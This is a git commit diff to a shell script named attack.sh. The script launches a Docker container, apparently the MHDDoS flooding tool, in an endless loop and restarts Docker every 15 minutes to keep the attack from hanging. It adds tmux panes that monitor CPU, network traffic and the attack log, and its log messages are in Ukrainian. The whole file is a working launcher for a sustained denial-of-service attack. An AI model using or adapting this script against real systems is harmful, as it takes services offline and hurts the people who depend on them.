27b2c27a759d40ede7b0d70bb97ac48d682a5259
va1d3mar <Valdemarius666@protonmail.com>
2022-04-13 09:40:03 +0300

    Update attack.sh

--- attack.sh
+++ attack.sh
@@ -1,4 +1,12 @@
 clear
+tmux new-session -s attack -d
+tmux split-window -t attack -h -p 50
+tmux split-window -t attack -v -p 66
+tmux split-window -t attack -v -p 50
+tmux select-window -t attack
+tmux send-keys -t 1 C-z 'htop' Enter
+tmux send-keys -t 2 C-z 'nload eth0' Enter
+tmux send-keys -t 3 C-z 'tail -f /var/log/attack.log' Enter
 logfile="/var/log/attack.log"
 command=$1
 parameter=$2
@@ -13,7 +21,9 @@ command="docker run -i --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddo
 echo "$(date "+%d.%m.%Y %H:%M:%S")" "Остаточна команда: " "$command" >> $logfile
 while true 
 do
-echo "$(date "+%d.%m.%Y %H:%M:%S")" "Починаю роботу докер-контейнеру" >> /var/log/attack.log & $command & echo "$(date "+%d.%m.%Y %H:%M:%S")" "Докер запустився" >> /var/log/attack.log & sleep 15m && echo "$(date "+%d.%m.%Y %H:%M:%S")" "Докер попрацював 15 хвилин, перезапускаю, шоб не висло" >> /var/log/attack.log && systemctl restart docker
+tmux select-window -t attack
+tmux select-pane -t 0
+echo "$(date "+%d.%m.%Y %H:%M:%S")" "Починаю роботу докер-контейнеру" >> /var/log/attack.log & tmux send-keys -t 0 C-z "$command" Enter & echo "$(date "+%d.%m.%Y %H:%M:%S")" "Докер запустився" >> /var/log/attack.log & sleep 15m && echo "$(date "+%d.%m.%Y %H:%M:%S")" "Докер попрацював 15 хвилин, перезапускаю, шоб не висло" >> /var/log/attack.log && systemctl restart docker
 echo "$(date "+%d.%m.%Y %H:%M:%S")" "Докер перезапущено, чекаю 5 секунд до перезапуску циклу, шоб встиг" >> /var/log/resting.log
 sleep 5
 done
